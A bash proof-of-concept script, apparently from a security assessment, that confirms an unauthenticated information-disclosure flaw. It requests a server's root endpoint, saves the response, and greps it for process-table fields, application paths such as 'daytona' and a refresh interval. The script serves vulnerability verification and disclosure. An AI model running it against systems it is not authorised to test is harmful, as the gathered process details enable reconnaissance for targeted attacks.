#!/bin/bash

# POC: Unauthenticated Server Process Information Disclosure
# This script demonstrates the vulnerability where the root endpoint (/)
# exposes detailed server process information without requiring authentication

TARGET_URL="${1:-http://localhost:8080/}"
OUTPUT_FILE="process_disclosure_response.html"

echo "[*] Testing for unauthenticated process information disclosure..."
echo "[*] Target: $TARGET_URL"
echo ""

# Make GET request to root endpoint without authentication
echo "[*] Sending GET request to root endpoint..."
HTTP_RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL")

# Extract status code (last line)
HTTP_STATUS=$(echo "$HTTP_RESPONSE" | tail -n1)
# Extract response body (everything except last line)
RESPONSE_BODY=$(echo "$HTTP_RESPONSE" | head -n -1)

echo "[+] HTTP Status Code: $HTTP_STATUS"
echo ""

# Save full response for inspection
echo "$RESPONSE_BODY" > "$OUTPUT_FILE"
echo "[+] Full response saved to: $OUTPUT_FILE"
echo ""

# Check for successful response
if [ "$HTTP_STATUS" = "200" ]; then
    echo "[+] VULNERABILITY CONFIRMED: Root endpoint is accessible without authentication (HTTP 200)"
    echo ""
    
    # Check for process table indicators
    if echo "$RESPONSE_BODY" | grep -q "<table"; then
        echo "[+] Process table found in response"
    fi
    
    # Check for process information patterns
    if echo "$RESPONSE_BODY" | grep -qE "UID|PID|%CPU|%MEM|VSZ|RSS|STAT|START|COMMAND"; then
        echo "[+] Process information fields detected (UID, PID, CPU, Memory, etc.)"
    fi
    
    # Check for specific indicators of running processes
    if echo "$RESPONSE_BODY" | grep -qE "daytona|usr/local/bin"; then
        echo "[+] Application-specific process information found:"
        echo "$RESPONSE_BODY" | grep -E "daytona|usr/local/bin" | head -n 5
        echo ""
    fi
    
    # Check for auto-refresh
    if echo "$RESPONSE_BODY" | grep -q "meta.*refresh"; then
        echo "[+] Auto-refresh enabled detected in page"
        REFRESH_INTERVAL=$(echo "$RESPONSE_BODY" | grep -o 'content="[0-9]*"' | grep -o '[0-9]*')
        echo "    Refresh interval: $REFRESH_INTERVAL seconds"
    fi
    
    # Extract process data from HTML table
    echo ""
    echo "[*] Extracting process information from response..."
    echo "================================================================"
    
    # Look for table rows with process data
    PROCESS_DATA=$(echo "$RESPONSE_BODY" | grep -oP '<tr>.*?</tr>' | head -n 10)
    
    if [ -n "$PROCESS_DATA" ]; then
        echo "[+] Sample process table rows detected"
        echo "$PROCESS_DATA" | head -n 3
    fi
    
    echo "================================================================"
    echo ""
    echo "[!] VULNERABILITY IMPACT:"
    echo "    - Unauthenticated access to server process information"
    echo "    - Sensitive system details exposed without authentication"
    echo "    - Enables reconnaissance for targeted attacks"
    echo "    - Reveals running services and application paths"
    echo ""
    exit 0
else
    echo "[-] Unexpected HTTP status code: $HTTP_STATUS"
    exit 1
fi